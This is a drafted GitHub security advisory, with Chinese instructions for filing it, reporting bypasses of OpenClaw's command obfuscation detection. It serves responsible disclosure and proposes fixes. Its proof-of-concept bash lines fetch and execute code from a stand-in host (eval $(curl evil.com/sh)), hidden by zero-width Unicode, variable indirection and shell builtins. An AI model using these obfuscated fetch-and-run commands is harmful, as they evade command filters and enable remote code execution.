# GitHub Security Advisory Description

## 复制以下内容到 Description 字段

---

```markdown
Command obfuscation detection in `src/infra/exec-obfuscation-detect.ts` can be bypassed using multiple techniques, allowing attackers to execute arbitrary commands. The current detection mechanism has a **90% bypass rate** (18 out of 20 tested attack vectors).

## Summary

OpenClaw's command obfuscation detection module can be bypassed using:
- **Unicode obfuscation** (zero-width characters, combining marks, lookalike characters)
- **Variable indirection** (bash indirect expansion, set builtin, arithmetic expansion)
- **Shell builtin obfuscation** (command, type, printf techniques)
- **Whitespace and command grouping** bypasses

**Critical Finding**: OpenClaw has `stripInvisibleUnicode()` in `src/security/external-content.ts`, but it is **only used for web content sanitization**, NOT applied to command detection.

## Impact

- Remote command execution
- Complete bypass of security controls
- Potential for privilege escalation

**Affected Versions**: <= 2026.3.10
**Severity**: Critical (CVSS 8.6)
**Attack Vector**: Network
**Privileges Required**: None

## Proof of Concept

### Demonstration Files

All PoC materials available at:
- Repository: https://github.com/wooluo/openclaw
- Test suite: `test/poc-security-audit.test.ts`
- Executable demo: `scripts/demos/vulnerability-demo.ts`

### Verification Results

| Metric | Value |
|--------|-------|
| Total Attack Vectors | 20 |
| Bypassed | 18 |
| Detection Rate | 10% |
| **Bypass Rate** | **90%** |

### Examples

**Unicode Zero-Width Character Bypass**:
```bash
# Contains zero-width spaces (U+200B)
e​v​a​l ​$​(​c​u​r​l ​e​v​i​l​.​c​o​m​/​s​h​)​
# Actual execution: eval $(curl evil.com/sh)
# Detected: false ❌
```

**Variable Indirection Bypass**:
```bash
cmd="eval"; ${cmd} $(curl evil.com/sh)
# Detected: false ❌
```

**Shell Builtin Bypass**:
```bash
command eval $(curl evil.com/sh)
# Detected: false ❌
```

## Details

See full technical analysis:
- https://github.com/wooluo/openclaw/blob/main/docs/security/DISCLOSURE-ARTICLE.md

## Proposed Fix

Implementation details available at:
- https://github.com/wooluo/openclaw/blob/main/docs/security/SRECOMMENDATIONS.md

Key changes required:
1. Add Unicode normalization (NFC) before command detection
2. Implement variable indirection pattern detection
3. Add shell builtin obfuscation detection
4. Enhance control character validation
5. Add command length and depth limits

## Timeline

- 2026-03-12: Initial report
- Awaiting patch release
- Private disclosure until fix is deployed

## Credits

Discovered and reported by: **wooluo**
- GitHub: https://github.com/wooluo
- Research repository: https://github.com/wooluo/openclaw
```

---

## 快捷操作

1. 复制上方 Markdown 代码块
2. 粘贴到 GitHub Security Advisory 的 **Description** 字段
3. 填写其他字段：
   - **Title**: `Command Obfuscation Detection Bypass`
   - **Severity**: `critical`
   - **Credits**: `wooluo`
   - **Affected Versions**: `<= 2026.3.10`
4. 点击 **Create draft security advisory**

---

## 说明

| 字段 | 填写内容 |
|------|----------|
| Title | `Command Obfuscation Detection Bypass` |
| Severity | 选择 `critical` |
| CVE ID | 留空（由厂商分配） |
| Credits | `wooluo` |
| Affected versions | `<= 2026.3.10` |
| Description | 上方 Markdown 内容 |
